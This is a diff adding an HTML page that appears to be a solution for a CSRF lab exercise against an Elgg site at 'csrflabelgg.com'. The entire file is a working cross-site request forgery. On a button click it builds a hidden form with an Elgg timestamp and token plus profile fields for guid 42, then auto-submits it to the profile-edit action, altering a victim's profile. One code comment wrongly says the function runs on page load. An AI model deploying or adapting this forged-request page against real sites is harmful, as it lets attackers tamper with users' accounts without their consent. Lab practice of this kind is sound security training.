@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>This page forges an HTTP POST request.</h1>
+<button type="button" id="hax">Click Me!</button>
+<script type="text/javascript">
+function forge_post()
+{
+	var fields;
+
+	fields += "<input type = 'hidden' name = '__elgg_ts' value = '150911811' />";
+	fields += "<input type = 'hidden' name = '__elgg_token' value = '6-xF3bB21bmdOe0z3mZn4G'/>";
+	fields += "<input type='hidden' name='name' value='Alice'>";
+	fields += "<input type='hidden' name='briefdescription' value='Bob is my hero'>";
+	fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+	fields += "<input type='hidden' name='guid' value='42'>";
+	// Create a <form> element.
+	var p = document.createElement("form");
+	// Construct the form
+	p.action = "http://www.csrflabelgg.com/action/profile/edit/";
+	p.innerHTML = fields;
+	p.method = "post";
+	// Append the form to the current page.
+	document.body.appendChild(p);
+	// Submit the form
+	p.submit();
+}
+// Invoke forge_post() after the page is loaded.
+butt = document.getElementById("hax")
+butt.onclick = function() { forge_post();}
+</script>
+</body>
+</html>
